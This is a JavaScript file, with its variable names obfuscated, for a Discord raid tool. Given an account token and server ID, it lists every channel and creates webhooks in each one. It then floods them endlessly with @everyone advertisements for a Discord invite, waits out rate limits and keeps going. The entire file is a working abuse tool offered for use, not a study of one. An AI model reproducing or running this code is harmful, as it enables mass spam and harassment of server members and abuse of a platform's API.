let stopSpam = false;
const logEl = document.getElementById("log");

document.addEventListener('DOMContentLoaded', () => {
    const defaultWebhookName = "今すぐにいーじ帝国に参加を❗️";
    document.getElementById("webhookName").value = defaultWebhookName;
    const defaultMessage = `# @everyone @here いーじ帝国にご参加を‼️
[ここから参加出来ます！](https://discord.gg/faWH7JZhUv)
いーじがトップだよ😂
discord.gg/faWH7JZhUv
今すぐにいーじ帝国に参加を❗️`;
    document.getElementById("message").value = defaultMessage;
});

function log(_0x2fa4ee) {
  const _0x3a82fb = new Date().toLocaleTimeString();
  logEl.textContent += "\n" + _0x3a82fb + " - " + _0x2fa4ee;
  logEl.scrollTop = logEl.scrollHeight;
}
document.getElementById("stopBtn").addEventListener('click', () => {
  stopSpam = true;
  log("🛑 停止しました");
  const _0x2446ac = document.getElementById("submitBtn");
  _0x2446ac.disabled = false;
  _0x2446ac.textContent = '実行';
});
async function spamWebhook(_0x515832, _0x4699bb) {
  while (!stopSpam) {
    try {
      const _0xf67a45 = await fetch(_0x515832, {
        'method': 'POST',
        'headers': {
          'Content-Type': "application/json"
        },
        'body': JSON.stringify({
          'content': _0x4699bb
        })
      });
      if (_0xf67a45.status === 0x1ad) {
        const _0x33c2f5 = await _0xf67a45.json();
        log("⏳ レート制限: " + _0x33c2f5.retry_after + 's');
        await new Promise(_0xd5a9ad => setTimeout(_0xd5a9ad, _0x33c2f5.retry_after * 0x3e8));
      } else {
        if (_0xf67a45.status < 0x12c) {
          log("✅ 送信成功");
        } else {
          log("❌ 送信失敗: status " + _0xf67a45.status);
          break;
        }
      }
    } catch (_0x10da44) {
      log("❌ 送信失敗: " + _0x10da44.message);
    }
  }
}
async function createWebhook(_0x4bd41e, _0x2654f9, _0xb12cc5, _0xf9cf4b) {
  const _0x232647 = {
    'Authorization': _0x4bd41e,
    'Content-Type': "application/json"
  };
  while (!stopSpam) {
    try {
      const _0x38edce = await fetch("https://discord.com/api/v9/channels/" + _0x2654f9 + "/webhooks", {
        'headers': _0x232647
      });
      if (_0x38edce.status === 0x1ad) {
        const _0x4b794e = await _0x38edce.json();
        log("⏳ 取得レート制限: " + _0x4b794e.retry_after + 's');
        await new Promise(_0x3bd115 => setTimeout(_0x3bd115, _0x4b794e.retry_after * 0x3e8));
        continue;
      }
      const _0x4e3f40 = await _0x38edce.json();
      if (_0x4e3f40.length > 0x0) {
        _0x4e3f40.forEach(_0x359b64 => {
          if (_0x359b64.name === _0xf9cf4b) {
            log("🔄 既存Webhook検出: " + _0x359b64.url);
            spamWebhook(_0x359b64.url, _0xb12cc5);
          }
        });
        if (_0x4e3f40.length >= 0xf) {
          log("ℹ Webhook上限に達しています (" + _0x4e3f40.length + ')');
          return;
        }
      }
    } catch (_0x49553e) {
      log("❌ 取得エラー: " + _0x49553e.message);
    }
    try {
      const _0x2b5e2f = await fetch("https://discord.com/api/v9/channels/" + _0x2654f9 + "/webhooks", {
        'method': "POST",
        'headers': _0x232647,
        'body': JSON.stringify({
          'name': _0xf9cf4b
        })
      });
      if (_0x2b5e2f.status === 0x1ad) {
        const _0x35506d = await _0x2b5e2f.json();
        log("⏳ 作成レート制限: " + _0x35506d.retry_after + 's');
        await new Promise(_0x101363 => setTimeout(_0x101363, _0x35506d.retry_after * 0x3e8));
        continue;
      } else {
        if (_0x2b5e2f.status > 0x12c) {
          log("❌ Webhook作成失敗: status " + _0x2b5e2f.status);
          break;
        }
      }
      const _0x21185c = await _0x2b5e2f.json();
      const _0x4b5c9f = _0x21185c.url;
      log("🚀 Webhook作成: " + _0x4b5c9f);
      spamWebhook(_0x4b5c9f, _0xb12cc5);
    } catch (_0x3fc616) {
      log("❌ 作成失敗: " + _0x3fc616.message);
      break;
    }
  }
}
async function main(_0x26cac4, _0x67f934, _0x4cf5a8, _0x45f058) {
  stopSpam = false;
  try {
    log("🔄 チャンネル取得中...");
    const _0x1670d4 = await fetch("https://discord.com/api/v9/guilds/" + _0x67f934 + "/channels", {
      'headers': {
        'Authorization': _0x26cac4
      }
    });
    const _0x59c148 = await _0x1670d4.json();
    const _0x228820 = _0x59c148.filter(_0x39198b => [0x0, 0x2, 0x5].includes(_0x39198b.type)).map(_0x35f8b9 => _0x35f8b9.id);
    log("🔀 対象チャネル: " + _0x228820.join(", "));
    for (const _0x27381e of _0x228820) {
      if (stopSpam) {
        break;
      }
      createWebhook(_0x26cac4, _0x27381e, _0x45f058, _0x4cf5a8);
    }
  } catch (_0x4fae82) {
    log("❌ " + _0x4fae82.message);
  }
}
document.getElementById("form").addEventListener("submit", _0x218c5b => {
  _0x218c5b.preventDefault();
  const _0x244931 = document.getElementById("submitBtn");
  _0x244931.disabled = true;
  _0x244931.textContent = "実行中...";
  const _0x28e44f = document.getElementById('token').value.trim();
  const _0x224baa = document.getElementById("guildId").value.trim();
  const _0x19d56f = document.getElementById("webhookName").value.trim();
  const _0x590438 = document.getElementById("message").value;
  main(_0x28e44f, _0x224baa, _0x19d56f, _0x590438);
});